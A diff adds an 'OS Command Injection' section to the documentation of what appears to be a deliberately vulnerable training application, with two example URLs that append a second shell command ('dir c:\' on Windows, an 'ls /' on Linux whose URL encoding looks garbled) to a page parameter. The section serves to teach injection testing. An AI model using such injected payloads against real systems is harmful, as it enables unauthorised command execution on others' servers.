@@ -185,6 +185,17 @@ return [
 ];
 ```
 
+## OS Command Injection
+
+To hack the page on Windows you can use: 
+```
+http://hackazon.dev/page/show?page=terms.html%20%26%26%20dir%20c:\
+```
+
+On Linux the same should be as follows:
+```
+http://hackazon.dev/page/show?page=terms.html%20%2620ls%20%2F
+```
 
 Vulnerability Module Structure
 ==============================
